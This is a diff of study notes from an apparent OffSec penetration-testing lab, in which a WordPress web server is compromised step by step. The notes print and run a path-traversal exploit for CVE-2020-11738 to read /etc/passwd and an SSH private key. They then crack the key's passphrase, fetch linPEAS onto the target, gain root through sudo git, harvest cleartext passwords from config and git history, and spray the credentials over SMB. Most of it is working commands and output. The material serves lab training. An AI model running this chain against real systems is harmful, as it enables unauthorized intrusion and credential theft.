+<li>Use vulnerabilities in WordPress Plugins .</li>
+<li>Crack the passphrase of an SSH private key.</li>
+<li>Elevate privileges using sudo commands.</li>
+<li>Leverage developer artifacts to obtain sensitive information.</li>
+</ul>
+<h5>Initial Foothold</h5>
+<p>In the prior unit we used SearchSploit to find exploits for Duplicator 1.3.26, two matched this version, and one was a Metasploit exploit.  Use SearchSploit to examine the other exploit.</p>
+<pre><code class="language-bash">┌──(operator㉿labhost)-[~/OffSec/beyond]
+└─$ searchsploit duplicator
+--------------------------------------------------------- ---------------------------------
+# Vendor Homepage: https://wordpress.org/plugins/duplicator/
+# Software Link: https://downloads.wordpress.org/plugin/duplicator.1.3.26.zip]
+# Version: 1.3.26
+# Tested on: Ubuntu 16.04
+# CVE : CVE-2020-11738
+
+import requests as re
+import sys
+
+if len(sys.argv) != 3:
         print(&quot;Exploit made by nam3lum.&quot;)
-        print(&quot;Usage: CVE-2020-11738.py <a href="http://192.168.168.167">http://192.168.168.167</a> /etc/passwd&quot;)
-        exit()</p>
-<p>arg = sys.argv[1]
-file = sys.argv[2]</p>
-<p>URL = arg + &quot;/wp-admin/admin-ajax.php?action=duplicator_download&amp;file=../../../../../../../../..&quot; + file</p>
-<p>output = re.get(url = URL)
-print(output.text)
-(END)</p>
-<pre><code>- Python code to exploit CVE-2020-11738.
+        print(&quot;Usage: CVE-2020-11738.py http://192.168.168.167 /etc/passwd&quot;)
+        exit()
 
-The script sends a GET req to a URL and adds a file name prepended with `../` expressions.  Copy the script with the `-m` option.
+arg = sys.argv[1]
+file = sys.argv[2]
+
+URL = arg + &quot;/wp-admin/admin-ajax.php?action=duplicator_download&amp;file=../../../../../../../../..&quot; + file
+
+output = re.get(url = URL)
+print(output.text)
+(END)
 </code></pre>
-<p>┌──(operator㉿labhost)-[~/OffSec/beyond]
-└─$ cd websrv1</p>
-<p>┌──(operator㉿labhost)-[~/OffSec/beyond/websrv1]
+<ul>
+<li>Python code to exploit CVE-2020-11738.</li>
+</ul>
+<p>The script sends a GET req to a URL and adds a file name prepended with <code>../</code> expressions.  Copy the script with the <code>-m</code> option.</p>
+<pre><code class="language-bash">┌──(operator㉿labhost)-[~/OffSec/beyond]
+└─$ cd websrv1
+
+┌──(operator㉿labhost)-[~/OffSec/beyond/websrv1]
 └─$ searchsploit -m 50420
   Exploit: Wordpress Plugin Duplicator 1.3.26 - Unauthenticated Arbitrary File Read
-      URL: <a href="https://www.exploit-db.com/exploits/50420">https://www.exploit-db.com/exploits/50420</a>
+      URL: https://www.exploit-db.com/exploits/50420
      Path: /usr/share/exploitdb/exploits/php/webapps/50420.py
     Codes: CVE-2020-11738
  Verified: False
 File Type: ASCII text
-Copied to: /home/operator/OffSec/beyond/websrv1/50420.py</p>
-<pre><code>
-Provide the target URL and file we want to read to use the script.  We will attempt to read `/etc/passwd` to confirm the target is vulnerable and to obtain user accounts from the system.
+Copied to: /home/operator/OffSec/beyond/websrv1/50420.py
 </code></pre>
-<p>┌──(operator㉿labhost)-[~/OffSec/beyond/websrv1]
-└─$ python 50420.py <a href="http://192.168.247.244">http://192.168.247.244</a> /etc/passwd
+<p>Provide the target URL and file we want to read to use the script.  We will attempt to read <code>/etc/passwd</code> to confirm the target is vulnerable and to obtain user accounts from the system.</p>
+<pre><code class="language-bash">┌──(operator㉿labhost)-[~/OffSec/beyond/websrv1]
+└─$ python 50420.py http://192.168.247.244 /etc/passwd
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 bin:x:2:2:bin:/bin:/usr/sbin/nologin
@@ -604,24 +631,25 @@ lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
 mysql:x:113:118:MySQL Server,,,:/nonexistent:/bin/false
 ftp:x:114:120:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
 daniela:x:1001:1001:,,,:/home/daniela:/bin/bash
-marcus:x:1002:1002:,,,:/home/marcus:/bin/bash</p>
-<pre><code>- We identify two user accounts of interest.
-    - `daniela`
-    - `marcus`
-
-Add the usernames to `creds.txt`.
-
-As we saw in Common Web Application Attacks there are several files of interest we can retrieve via path traversal to obtain access to a system.  One common method is to retrieve SSH private keys that are overly permissive.
-
-We will attempt to retrieve a SSH private with the name `id_rsa`.  The name will differ depending on what type of key is created with `ssh-keygen`, for instance a `ecdsa` key type would have the default priv key name `id_ecdsa`.
-
-Let&#39;s check both user home directories!
+marcus:x:1002:1002:,,,:/home/marcus:/bin/bash
 </code></pre>
-<p>┌──(operator㉿labhost)-[~/OffSec/beyond/websrv1]
-└─$ python 50420.py <a href="http://192.168.247.244">http://192.168.247.244</a> /home/marcus/.ssh/id_rsa
-Invalid installer file name!!</p>
-<p>┌──(operator㉿labhost)-[~/OffSec/beyond/websrv1]
-└─$ python 50420.py <a href="http://192.168.247.244">http://192.168.247.244</a> /home/daniela/.ssh/id_rsa
+<ul>
+<li>We identify two user accounts of interest.<ul>
+<li><code>daniela</code></li>
+<li><code>marcus</code></li>
+</ul>
+</li>
+</ul>
+<p>Add the usernames to <code>creds.txt</code>.</p>
+<p>As we saw in Common Web Application Attacks there are several files of interest we can retrieve via path traversal to obtain access to a system.  One common method is to retrieve SSH private keys that are overly permissive.</p>
+<p>We will attempt to retrieve a SSH private with the name <code>id_rsa</code>.  The name will differ depending on what type of key is created with <code>ssh-keygen</code>, for instance a <code>ecdsa</code> key type would have the default priv key name <code>id_ecdsa</code>.</p>
+<p>Let&#39;s check both user home directories!</p>
+<pre><code class="language-bash">┌──(operator㉿labhost)-[~/OffSec/beyond/websrv1]
+└─$ python 50420.py http://192.168.247.244 /home/marcus/.ssh/id_rsa
+Invalid installer file name!!
+
+┌──(operator㉿labhost)-[~/OffSec/beyond/websrv1]
+└─$ python 50420.py http://192.168.247.244 /home/daniela/.ssh/id_rsa
 -----BEGIN OPENSSH PRIVATE KEY-----
 b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABBAElTUsf
 3CytILJX83Yd9rAAAAEAAAAAEAAAGXAAAAB3NzaC1yc2EAAAADAQABAAABgQDwl5IEgynx
@@ -660,20 +688,22 @@ UoRUBJIeKEdUlvbjNuXE26AwzrITwrQRlwZP5WY+UwHgM2rx1SFmCHmbcfbD8j9YrYgUAu
 vJbdmDQSd7+WQ2RuTDhK2LWCO3YbtOd6p84fKpOfFQeBLmmSKTKSOddcSTpIRSu7RCMvqw
 l+pUiIuSNB2JrMzRAirldv6FODOlbtO6P/iwAO4UbNCTkyRkeOAz1DiNLEHfAZrlPbRHpm
 QduOTpMIvVMIJcfeYF1GJ4ggUG4=
------END OPENSSH PRIVATE KEY-----</p>
-<pre><code>- We retrieved the ssh priv key for `daniela`
- - Save the file locally as `id_rsa`
-
-Let&#39;s attempt to leverage the key to access WEBSRV1 as `daniela` over SSH, we first have to set the permissions of the key.
+-----END OPENSSH PRIVATE KEY-----
 </code></pre>
-<p>┌──(operator㉿labhost)-[~/OffSec/beyond/websrv1]
-└─$ ssh -o IdentitiesOnly=yes -i daniela-id_rsa <a href="mailto:daniela@192.168.247.244">daniela@192.168.247.244</a>
-<a href="mailto:daniela@192.168.247.244">daniela@192.168.247.244</a>&#39;s password:</p>
-<pre><code>- The key is protected by a passphrase.
-
-We can use `ssh2john` and `john` with the `rockyou.txt` wordlist and attempt to crack the passphrase.
+<ul>
+<li>We retrieved the ssh priv key for <code>daniela</code></li>
+<li>Save the file locally as <code>id_rsa</code></li>
+</ul>
+<p>Let&#39;s attempt to leverage the key to access WEBSRV1 as <code>daniela</code> over SSH, we first have to set the permissions of the key.</p>
+<pre><code class="language-bash">┌──(operator㉿labhost)-[~/OffSec/beyond/websrv1]
+└─$ ssh -o IdentitiesOnly=yes -i daniela-id_rsa daniela@192.168.247.244
+daniela@192.168.247.244&#39;s password:
 </code></pre>
-<p>┌──(operator㉿labhost)-[~/OffSec/beyond/websrv1]
+<ul>
+<li>The key is protected by a passphrase.</li>
+</ul>
+<p>We can use <code>ssh2john</code> and <code>john</code> with the <code>rockyou.txt</code> wordlist and attempt to crack the passphrase.</p>
+<pre><code class="language-bash">┌──(operator㉿labhost)-[~/OffSec/beyond/websrv1]
 └─$ john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash
 Using default input encoding: UTF-8
 Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
@@ -684,79 +714,86 @@ Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
 tequieromucho    (daniela-id_rsa)
 1g 0:00:00:30 DONE (2023-12-29 09:37) 0.03290g/s 46.33p/s 46.33c/s 46.33C/s teacher..tagged
 Use the &quot;--show&quot; option to display all of the cracked passwords reliably
-Session completed.</p>
-<pre><code>- We recovered passphrase `tequieromucho`
-
-Let&#39;s attempt SSH access again.
+Session completed.
 </code></pre>
-<p>┌──(operator㉿labhost)-[~/OffSec/beyond/websrv1]
-└─$ ssh -o IdentitiesOnly=yes -i daniela-id_rsa <a href="mailto:daniela@192.168.247.244">daniela@192.168.247.244</a>
-Enter passphrase for key &#39;daniela-id_rsa&#39;:
-Welcome to Ubuntu 22.04.1 LTS (GNU/Linux 5.15.0-50-generic x86_64)</p>
 <ul>
-<li>Documentation:  <a href="https://help.ubuntu.com">https://help.ubuntu.com</a></li>
-<li>Management:     <a href="https://landscape.canonical.com">https://landscape.canonical.com</a></li>
-<li>Support:        <a href="https://ubuntu.com/advantage">https://ubuntu.com/advantage</a></li>
+<li>We recovered passphrase <code>tequieromucho</code></li>
 </ul>
-<p>  System information as of Fri Dec 29 05:39:20 PM UTC 2023</p>
-<p>  System load:  0.0               Processes:               211
+<p>Let&#39;s attempt SSH access again.</p>
+<pre><code class="language-bash">┌──(operator㉿labhost)-[~/OffSec/beyond/websrv1]
+└─$ ssh -o IdentitiesOnly=yes -i daniela-id_rsa daniela@192.168.247.244
+Enter passphrase for key &#39;daniela-id_rsa&#39;:
+Welcome to Ubuntu 22.04.1 LTS (GNU/Linux 5.15.0-50-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Fri Dec 29 05:39:20 PM UTC 2023
+
+  System load:  0.0               Processes:               211
   Usage of /:   73.8% of 8.02GB   Users logged in:         0
   Memory usage: 22%               IPv4 address for ens192: 192.168.247.244
-  Swap usage:   0%</p>
-<ul>
-<li><p>Super-optimized for small spaces - read how we shrank the memory
-footprint of MicroK8s to make it the smallest full K8s around.</p>
-<p><a href="https://ubuntu.com/blog/microk8s-memory-optimisation">https://ubuntu.com/blog/microk8s-memory-optimisation</a></p>
-</li>
-</ul>
-<p>13 updates can be applied immediately.
-To see these additional updates run: apt list --upgradable</p>
-<p>The list of available updates is more than a week old.
-To check for new updates run: sudo apt update</p>
-<p>Last login: Wed Nov  2 09:57:32 2022 from 192.168.118.5
-daniela@websrv1:~$</p>
-<pre><code>- We successfully gain access to our first target!
+  Swap usage:   0%
 
-Before performing post exploitation enumeration, we add the passphrase to our `creds.txt` file.  Users tend to resuse passwords, we may need it later in the assessment.
+ * Super-optimized for small spaces - read how we shrank the memory
+   footprint of MicroK8s to make it the smallest full K8s around.
 
-##### A Link to the Past
+   https://ubuntu.com/blog/microk8s-memory-optimisation
 
-Now that we have gained access to a target, WEBSRV1, we can perform local enum to identify attack vectors and sensitive info that may lead us to PrivEsc.
+13 updates can be applied immediately.
+To see these additional updates run: apt list --upgradable
 
-We often have time constraints in pentests, so we will use `linPEAS` to automate the process and identify low hanging fruit.  Copy `linpeas.sh` to our `websrv1` subdirectory and transfer it to the server.
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+Last login: Wed Nov  2 09:57:32 2022 from 192.168.118.5
+daniela@websrv1:~$
 </code></pre>
-<p>┌──(operator㉿labhost)-[~/OffSec/beyond/websrv1]
+<ul>
+<li>We successfully gain access to our first target!</li>
+</ul>
+<p>Before performing post exploitation enumeration, we add the passphrase to our <code>creds.txt</code> file.  Users tend to resuse passwords, we may need it later in the assessment.</p>
+<h5>A Link to the Past</h5>
+<p>Now that we have gained access to a target, WEBSRV1, we can perform local enum to identify attack vectors and sensitive info that may lead us to PrivEsc.</p>
+<p>We often have time constraints in pentests, so we will use <code>linPEAS</code> to automate the process and identify low hanging fruit.  Copy <code>linpeas.sh</code> to our <code>websrv1</code> subdirectory and transfer it to the server.</p>
+<pre><code class="language-bash">┌──(operator㉿labhost)-[~/OffSec/beyond/websrv1]
 └─$ python3 -m http.server 80
-Serving HTTP on 0.0.0.0 port 80 (<a href="http://0.0.0.0:80/">http://0.0.0.0:80/</a>) ...
-192.168.247.244 - - [29/Dec/2023 09:48:40] &quot;GET /linpeas.sh HTTP/1.1&quot; 200 -</p>
-<p>daniela@websrv1:~$ wget <a href="http://192.168.45.163/linpeas.sh">http://192.168.45.163/linpeas.sh</a>
---2023-12-29 17:48:40--  <a href="http://192.168.45.163/linpeas.sh">http://192.168.45.163/linpeas.sh</a>
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+192.168.247.244 - - [29/Dec/2023 09:48:40] &quot;GET /linpeas.sh HTTP/1.1&quot; 200 -
+
+daniela@websrv1:~$ wget http://192.168.45.163/linpeas.sh
+--2023-12-29 17:48:40--  http://192.168.45.163/linpeas.sh
 Connecting to 192.168.45.163:80... connected.
 HTTP request sent, awaiting response... 200 OK
 Length: 848400 (829K) [text/x-sh]
-Saving to: ‘linpeas.sh’</p>
-<p>linpeas.sh             100%[===========================&gt;] 828.52K  1.77MB/s    in 0.5s</p>
-<p>2023-12-29 17:48:40 (1.77 MB/s) - ‘linpeas.sh’ saved [848400/848400]</p>
-<pre><code>- Serve with `http.server`
-- Download to target with `wget`
+Saving to: ‘linpeas.sh’
 
-Mark the file exec with `chmod a+x linpeas.sh`, then we can run the script to start enum.
+linpeas.sh             100%[===========================&gt;] 828.52K  1.77MB/s    in 0.5s
+
+2023-12-29 17:48:40 (1.77 MB/s) - ‘linpeas.sh’ saved [848400/848400]
 </code></pre>
-<p>./linpeas.sh</p>
-<pre><code>
-Once complete we can review the results, starting with system info.
+<ul>
+<li>Serve with <code>http.server</code></li>
+<li>Download to target with <code>wget</code></li>
+</ul>
+<p>Mark the file exec with <code>chmod a+x linpeas.sh</code>, then we can run the script to start enum.</p>
+<pre><code>./linpeas.sh
 </code></pre>
-<p>╔══════════╣ Operative system
-╚ <a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits">https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits</a><br>Linux version 5.15.0-48-generic (buildd@lcy02-amd64-080) (gcc (Ubuntu 11.2.0-19ubuntu1) 11.2.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #54-Ubuntu SMP Fri Aug 26 13:26:29 UTC 2022<br>Distributor ID: Ubuntu
+<p>Once complete we can review the results, starting with system info.</p>
+<pre><code>╔══════════╣ Operative system
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits                                                                                                                           
+Linux version 5.15.0-48-generic (buildd@lcy02-amd64-080) (gcc (Ubuntu 11.2.0-19ubuntu1) 11.2.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #54-Ubuntu SMP Fri Aug 26 13:26:29 UTC 2022                           
+Distributor ID: Ubuntu
 Description:    Ubuntu 22.04.1 LTS
 Release:        22.04
-Codename:       jammy</p>
-<pre><code>
-Next, network interfaces.
+Codename:       jammy
 </code></pre>
-<p>╔══════════╣ Interfaces</p>
-<h1>symbolic names for networks, see networks(5) for more information</h1>
-<p>link-local 169.254.0.0
+<p>Next, network interfaces.</p>
+<pre><code>╔══════════╣ Interfaces
+# symbolic names for networks, see networks(5) for more information                                                                                                                                          
+link-local 169.254.0.0
 1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
     link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
     inet 127.0.0.1/8 scope host lo
@@ -769,143 +806,156 @@ Next, network interfaces.
     inet 192.168.50.244/24 brd 192.168.50.255 scope global ens192
        valid_lft forever preferred_lft forever
     inet6 fe80::250:56ff:fe8a:265d/64 scope link 
-       valid_lft forever preferred_lft forever</p>
-<pre><code>- The listing shows only one iface.
- - The target is not connected to an internal network.
-  - We cannot pivot from it.
-
-We already enumerated MAILSRV1 without any actionable result and WEBSRV1 is not connected to an internal network, so we need to discover sensitive info to achieve a foothold on the internal network.  To obtain files and data from other system users, PrivEsc becomes our priority.
-
-Results from linPEAS contain interesting info regarding sudo commands.
+       valid_lft forever preferred_lft forever
 </code></pre>
-<p>╔══════════╣ Checking &#39;sudo -l&#39;, /etc/sudoers, and /etc/sudoers.d
-╚ <a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid">https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid</a>
+<ul>
+<li>The listing shows only one iface.</li>
+<li>The target is not connected to an internal network.</li>
+<li>We cannot pivot from it.</li>
+</ul>
+<p>We already enumerated MAILSRV1 without any actionable result and WEBSRV1 is not connected to an internal network, so we need to discover sensitive info to achieve a foothold on the internal network.  To obtain files and data from other system users, PrivEsc becomes our priority.</p>
+<p>Results from linPEAS contain interesting info regarding sudo commands.</p>
+<pre><code>╔══════════╣ Checking &#39;sudo -l&#39;, /etc/sudoers, and /etc/sudoers.d
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
 Matching Defaults entries for daniela on websrv1:
-    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin, use_pty</p>
-<p>User daniela may run the following commands on websrv1:
-    (ALL) NOPASSWD: /usr/bin/git</p>
-<pre><code>- User `daniela` can run `/usr/bin/git` with sudo privs and without a password.
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
 
-Before we leverage this, we will finish reviewing the linePEAS results.  The section `Analyzing Wordpress Files` contains cleartext passwords for database access.
+User daniela may run the following commands on websrv1:
+    (ALL) NOPASSWD: /usr/bin/git
 </code></pre>
-<p>╔══════════╣ Analyzing Wordpress Files (limit 70)
+<ul>
+<li>User <code>daniela</code> can run <code>/usr/bin/git</code> with sudo privs and without a password.</li>
+</ul>
+<p>Before we leverage this, we will finish reviewing the linePEAS results.  The section <code>Analyzing Wordpress Files</code> contains cleartext passwords for database access.</p>
+<pre><code>╔══════════╣ Analyzing Wordpress Files (limit 70)
 -rw-r--r-- 1 www-data www-data 2495 Sep 27  2022 /srv/www/wordpress/wp-config.php
 define( &#39;DB_NAME&#39;, &#39;wordpress&#39; );
 define( &#39;DB_USER&#39;, &#39;wordpress&#39; );
 define( &#39;DB_PASSWORD&#39;, &#39;DanielKeyboard3311&#39; );
-define( &#39;DB_HOST&#39;, &#39;localhost&#39; );</p>
-<pre><code>- Cleartext passwords are always high value.
- - Save them to `creds.txt`
-- Also note that the WP path is `/srv/www/wordpress/`
- - Not Debian default `/var/www/html`
-
-As we continue to review results, we find that the WordPress directory is a Git repo.
+define( &#39;DB_HOST&#39;, &#39;localhost&#39; );
 </code></pre>
-<p>╔══════════╣ Analyzing Github Files (limit 70)</p>
-<p>drwxr----- 8 root root 4096 Oct  4  2022 /srv/www/wordpress/.git</p>
-<pre><code>- We can assume Git is used as the version control system for the WP instance.
- - Reviewing commits of the Git repo may allow us to identify changes in the config data and sensitive info, such as passwords.
+<ul>
+<li>Cleartext passwords are always high value.</li>
+<li>Save them to <code>creds.txt</code></li>
+<li>Also note that the WP path is <code>/srv/www/wordpress/</code></li>
+<li>Not Debian default <code>/var/www/html</code></li>
+</ul>
+<p>As we continue to review results, we find that the WordPress directory is a Git repo.</p>
+<pre><code>╔══════════╣ Analyzing Github Files (limit 70)
 
-The dir is owned by root and not readable to other users, but we can leverage sudo to use Git commands in priv context, searching the repo for info.
 
-Git diff of last commit.
+
+drwxr----- 8 root root 4096 Oct  4  2022 /srv/www/wordpress/.git
 </code></pre>
-<p>daniela@websrv1:/srv/www/wordpress$ sudo git show
+<ul>
+<li>We can assume Git is used as the version control system for the WP instance.</li>
+<li>Reviewing commits of the Git repo may allow us to identify changes in the config data and sensitive info, such as passwords.</li>
+</ul>
+<p>The dir is owned by root and not readable to other users, but we can leverage sudo to use Git commands in priv context, searching the repo for info.</p>
+<p>Git diff of last commit.</p>
+<pre><code class="language-bash">daniela@websrv1:/srv/www/wordpress$ sudo git show
 commit 612ff5783cc5dbd1e0e008523dba83374a84aaf1 (HEAD, master)
 Author: root &lt;root@websrv1&gt;
-Date:   Tue Sep 27 14:26:15 2022 +0000</p>
-<pre><code>Removed staging script and internal network access
-</code></pre>
-<h2>diff --git a/fetch_current.sh b/fetch_current.sh
+Date:   Tue Sep 27 14:26:15 2022 +0000
+
+    Removed staging script and internal network access
+
+diff --git a/fetch_current.sh b/fetch_current.sh
 deleted file mode 100644
 index 25667c7..0000000
 --- a/fetch_current.sh
 +++ /dev/null
 @@ -1,6 +0,0 @@
--#!/bin/bash</h2>
-<h2>-# Script to obtain the current state of the web app from the staging server</h2>
-<h2>-sshpass -p &quot;dqsTwTpZPn#nL&quot; rsync <a href="mailto:john@192.168.50.245">john@192.168.50.245</a>:/current_webapp/ /srv/www/wordpress/</h2>
-<pre><code>
-To summarize, WEBSRV1:
-- Runs Ubuntu 22.04.
-- Is not connected to an internal network.
-- Sudoers file allows `daniela` to run `/usr/bin/git` w/o password.
-- WP dir is a Git repo.
-- Obtained cleartext passwords.
- - WP DB.
- - User `john`
-
-Most commands that run `sudo` can be abused to obtain an interactive shell with elevated privs.  To find potential abuses of the `git` bin running as sudo, we can consult [GTFOBins](https://gtfobins.github.io/).
-- Enter `git` in the search bar.
-- Scroll down to the &quot;Sudo&quot; section.
-We find 5 potential attack vectors we can try.  The second vector opens the help menu in the default pager, `less` is the most popular one on Linux.  The pager navigation commands are simliar to `vi` and can be used to exec code in the context of the user account that launched the pager.
+-#!/bin/bash
+-
+-# Script to obtain the current state of the web app from the staging server
+-
+-sshpass -p &quot;dqsTwTpZPn#nL&quot; rsync john@192.168.50.245:/current_webapp/ /srv/www/wordpress/
+-
 </code></pre>
-<p>sudo git -p help config</p>
-<pre><code>To exec code, enter `!` followed by a command or path to an executable file.  We can enter a path to a shell and use `/bin/bash` to gain an interactive shell.
+<p>To summarize, WEBSRV1:</p>
+<ul>
+<li>Runs Ubuntu 22.04.</li>
+<li>Is not connected to an internal network.</li>
+<li>Sudoers file allows <code>daniela</code> to run <code>/usr/bin/git</code> w/o password.</li>
+<li>WP dir is a Git repo.</li>
+<li>Obtained cleartext passwords.</li>
+<li>WP DB.</li>
+<li>User <code>john</code></li>
+</ul>
+<p>Most commands that run <code>sudo</code> can be abused to obtain an interactive shell with elevated privs.  To find potential abuses of the <code>git</code> bin running as sudo, we can consult <a href="https://gtfobins.github.io/">GTFOBins</a>.</p>
+<ul>
+<li>Enter <code>git</code> in the search bar.</li>
+<li>Scroll down to the &quot;Sudo&quot; section.
+We find 5 potential attack vectors we can try.  The second vector opens the help menu in the default pager, <code>less</code> is the most popular one on Linux.  The pager navigation commands are simliar to <code>vi</code> and can be used to exec code in the context of the user account that launched the pager.</li>
+</ul>
+<pre><code class="language-bash">sudo git -p help config
 </code></pre>
-<p>...
-       git config [<file-option>] [--fixed-value] --unset-all name [value-pattern]
-       git config [<file-option>] --rename-section old_name new_name
-       git config [<file-option>] --remove-section name
+<p>To exec code, enter <code>!</code> followed by a command or path to an executable file.  We can enter a path to a shell and use <code>/bin/bash</code> to gain an interactive shell.</p>
+<pre><code>...
+       git config [&lt;file-option&gt;] [--fixed-value] --unset-all name [value-pattern]
+       git config [&lt;file-option&gt;] --rename-section old_name new_name
+       git config [&lt;file-option&gt;] --remove-section name
 !/bin/bash
 root@websrv1:/srv/www/wordpress# whoami
-root</p>
-<pre><code>- We elevated privs successfully.
-
-We can continue enum with root privs.  Change dir to the Git repo, use `git status`, and `git log` to show commit history.  We can use `git show` and provide the hash of the latest commit to see changes after the first commit.
+root
 </code></pre>
-<p>root@websrv1:/srv/www/wordpress# git show 612ff5783cc5dbd1e0e008523dba83374a84aaf1
+<ul>
+<li>We elevated privs successfully.</li>
+</ul>
+<p>We can continue enum with root privs.  Change dir to the Git repo, use <code>git status</code>, and <code>git log</code> to show commit history.  We can use <code>git show</code> and provide the hash of the latest commit to see changes after the first commit.</p>
+<pre><code class="language-bash">root@websrv1:/srv/www/wordpress# git show 612ff5783cc5dbd1e0e008523dba83374a84aaf1
 commit 612ff5783cc5dbd1e0e008523dba83374a84aaf1 (HEAD, master)
 Author: root &lt;root@websrv1&gt;
-Date:   Tue Sep 27 14:26:15 2022 +0000</p>
-<pre><code>Removed staging script and internal network access
-</code></pre>
-<h2>diff --git a/fetch_current.sh b/fetch_current.sh
+Date:   Tue Sep 27 14:26:15 2022 +0000
+
+    Removed staging script and internal network access
+
+diff --git a/fetch_current.sh b/fetch_current.sh
 deleted file mode 100644
 index 25667c7..0000000
 --- a/fetch_current.sh
 +++ /dev/null
 @@ -1,6 +0,0 @@
--#!/bin/bash</h2>
-<h2>-# Script to obtain the current state of the web app from the staging server</h2>
-<h2>-sshpass -p &quot;dqsTwTpZPn#nL&quot; rsync <a href="mailto:john@192.168.50.245">john@192.168.50.245</a>:/current_webapp/ /srv/www/wordpress/</h2>
-<pre><code>- The info we retrieved earlier using sudo.
-
-Automating tasks with [sshpass](https://linux.die.net/man/1/sshpass) is a common way to provide a password to scripts non-interactively.  We added this to our `creds.txt`.
-
-*In a real assessment, we should run linPEAS again, once we have obtained privileged access to the system. Because the tool can now access files of other users and the system, it may discover sensitive information and data that wasn&#39;t accessible when running as daniela.*
-
-#### 24.3 Gaining Access to the Internal Network
- 
-- Validate domain credentials from a non-domain-joined machine.
-- Perform phishing to get access to the internal network.
-
-##### Domain Credentials
-
-Now we&#39;ll attempt to identify a valid combination of creds for MAILSRV1.  We start with the info in our `creds.txt`.
+-#!/bin/bash
+-
+-# Script to obtain the current state of the web app from the staging server
+-
+-sshpass -p &quot;dqsTwTpZPn#nL&quot; rsync john@192.168.50.245:/current_webapp/ /srv/www/wordpress/
+-
 </code></pre>
-<p>┌──(operator㉿labhost)-[~/OffSec/beyond/websrv1]
+<ul>
+<li>The info we retrieved earlier using sudo.</li>
+</ul>
+<p>Automating tasks with <a href="https://linux.die.net/man/1/sshpass">sshpass</a> is a common way to provide a password to scripts non-interactively.  We added this to our <code>creds.txt</code>.</p>
+<p><em>In a real assessment, we should run linPEAS again, once we have obtained privileged access to the system. Because the tool can now access files of other users and the system, it may discover sensitive information and data that wasn&#39;t accessible when running as daniela.</em></p>
+<h4>24.3 Gaining Access to the Internal Network</h4>
+<ul>
+<li>Validate domain credentials from a non-domain-joined machine.</li>
+<li>Perform phishing to get access to the internal network.</li>
+</ul>
+<h5>Domain Credentials</h5>
+<p>Now we&#39;ll attempt to identify a valid combination of creds for MAILSRV1.  We start with the info in our <code>creds.txt</code>.</p>
+<pre><code class="language-bash">┌──(operator㉿labhost)-[~/OffSec/beyond/websrv1]
 └─$ cat ../creds.txt
 daniela tequieromucho
 marcus
 wordpress DanielKeyboard3311
 DB_NAME wordpress DB_HOST localhost
-<a href="mailto:john@192.168.50.245">john@192.168.50.245</a> dqsTwTpZPn#nL</p>
-<pre><code>
-We&#39;ll create a list of usernames containing `marcus`, `john`, `daniela`, and omit `wordpress` as it is only used in a local DB connection for the WP instance on WEBSRV1.  We then create a password list containing the passwords we found.
+john@192.168.50.245 dqsTwTpZPn#nL
 </code></pre>
-<p>┌──(operator㉿labhost)-[~/OffSec/beyond]
+<p>We&#39;ll create a list of usernames containing <code>marcus</code>, <code>john</code>, <code>daniela</code>, and omit <code>wordpress</code> as it is only used in a local DB connection for the WP instance on WEBSRV1.  We then create a password list containing the passwords we found.</p>
+<pre><code class="language-bash">┌──(operator㉿labhost)-[~/OffSec/beyond]
 └─$ cat usernames.txt &amp;&amp; cat passwords.txt
 daniela
 marcus
 john
 DanielKeyboard3311
 tequieromucho
-dqsTwTpZPn#nL</p>
-<pre><code>
-Next we will use `crackmapexec` to check the creds against SMB on MAILSRV1, specifying `--continue-on-success`.
+dqsTwTpZPn#nL
 </code></pre>
-<p>┌──(operator㉿labhost)-[~/OffSec/beyond]
+<p>Next we will use <code>crackmapexec</code> to check the creds against SMB on MAILSRV1, specifying <code>--continue-on-success</code>.</p>
+<pre><code class="language-bash">┌──(operator㉿labhost)-[~/OffSec/beyond]
 └─$ crackmapexec smb 192.168.247.242 -u usernames.txt -p passwords.txt --continue-on-success
 SMB         192.168.247.242 445    MAILSRV1         [*] Windows 10.0 Build 20348 x64 (name:MAILSRV1) (domain:beyond.com) (signing:False) (SMBv1:False)
 SMB         192.168.247.242 445    MAILSRV1         [-] beyond.com\daniela:DanielKeyboard3311 STATUS_LOGON_FAILURE
@@ -916,22 +966,22 @@ SMB         192.168.247.242 445    MAILSRV1         [-] beyond.com\marcus:tequie
 SMB         192.168.247.242 445    MAILSRV1         [-] beyond.com\marcus:dqsTwTpZPn#nL STATUS_LOGON_FAILURE
 SMB         192.168.247.242 445    MAILSRV1         [-] beyond.com\john:DanielKeyboard3311 STATUS_LOGON_FAILURE
 SMB         192.168.247.242 445    MAILSRV1         [-] beyond.com\john:tequieromucho STATUS_LOGON_FAILURE
-SMB         192.168.247.242 445    MAILSRV1         [+] beyond.com\john:dqsTwTpZPn#nL</p>
-<pre><code>- We identify one valid set of creds from the staging script we on WEBSRV1.
